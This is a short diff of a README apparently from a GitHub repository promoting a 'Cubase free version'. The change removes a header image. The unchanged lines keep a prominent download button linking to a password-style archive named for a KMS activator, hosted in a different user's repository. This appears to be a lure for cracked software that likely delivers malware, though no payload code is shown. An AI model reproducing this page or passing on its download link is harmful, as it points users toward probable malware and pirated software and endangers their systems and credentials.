@@ -1,4 +1,4 @@
-![cubase](https://github.com/smoritat/smorirepo/assets/153454045/4c194bf2-85c4-473a-8146-859ae2b45c17)# <h1 align=center> CUBASE FREE VERSION (NEWEST UPDATE)
+# <h1 align=center> CUBASE FREE VERSION (NEWEST UPDATE)
 <h2 align=center><a href='https://github.com/krishgel/krishrepo/releases/download/launcher/KMSbyGitHub_Passwd_2023_LatestVersion.rar'><img src='https://github.com/smoritat/smorirepo/assets/153454045/c632dffa-0b11-4dd9-ae81-cebb132c5853'></a></h2>
 
 # <h1 align=center> DESCRIPTION OF CUBASE
